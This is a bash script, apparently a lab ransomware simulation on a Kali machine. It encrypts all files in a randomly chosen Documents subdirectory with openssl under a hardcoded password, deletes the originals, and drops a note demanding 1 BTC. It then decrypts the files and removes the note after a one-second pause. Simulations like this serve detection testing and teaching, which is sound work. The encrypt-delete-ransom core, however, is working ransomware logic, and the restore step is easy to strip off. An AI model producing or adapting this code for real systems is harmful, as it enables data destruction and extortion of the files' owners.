#!/bin/bash
# Encrypt files in a randomly chosen directory inside /home/kali/Documents and then decrypt them for cleanup

BASE_DIR="/home/kali/Documents"
PASSWORD="testpassword"  # Encryption password
EXTENSION=".enc"  # Extension for encrypted files

# Ensure the base directory exists
if [ ! -d "$BASE_DIR" ]; then
    echo "Base directory $BASE_DIR does not exist. Exiting."
    exit 1
fi

# Get a list of directories within BASE_DIR and choose one at random
DIR_LIST=("$BASE_DIR"/*/)
if [ ${#DIR_LIST[@]} -eq 0 ]; then
    echo "No directories found in $BASE_DIR. Exiting."
    exit 1
fi

RANDOM_DIR="${DIR_LIST[RANDOM % ${#DIR_LIST[@]}]}"
RANDOM_DIR_NAME=$(basename "$RANDOM_DIR")

echo "Encrypting files in $RANDOM_DIR..."

# Encrypt each file in the selected directory
for file in "$RANDOM_DIR"*; do
    if [ -f "$file" ]; then
        openssl enc -aes-256-cbc -salt -in "$file" -out "${file}${EXTENSION}" -k "$PASSWORD"
        rm "$file"  # Remove original file after encryption
    fi
done

# Create a ransom note inside the encrypted directory
RANSOM_NOTE="$RANDOM_DIR/ransom_note.txt"
echo "Files in '$RANDOM_DIR_NAME' have been encrypted. Send 1 BTC to unlock." > "$RANSOM_NOTE"

echo "Encryption complete. Ransom note placed in $RANDOM_DIR."

# Simulating time delay before cleanup (adjust as needed)
sleep 1

echo "Cleaning up and decrypting files in $RANDOM_DIR..."

# Decrypt each file back to its original form
for file in "$RANDOM_DIR"*"$EXTENSION"; do
    if [ -f "$file" ]; then
        original_file="${file%$EXTENSION}"  # Remove .enc extension
        openssl enc -d -aes-256-cbc -salt -in "$file" -out "$original_file" -k "$PASSWORD"
        rm "$file"  # Remove encrypted file after decryption
    fi
done

# Remove the ransom note
rm -f "$RANSOM_NOTE"

echo "Cleanup complete. Files in '$RANDOM_DIR_NAME' have been restored."
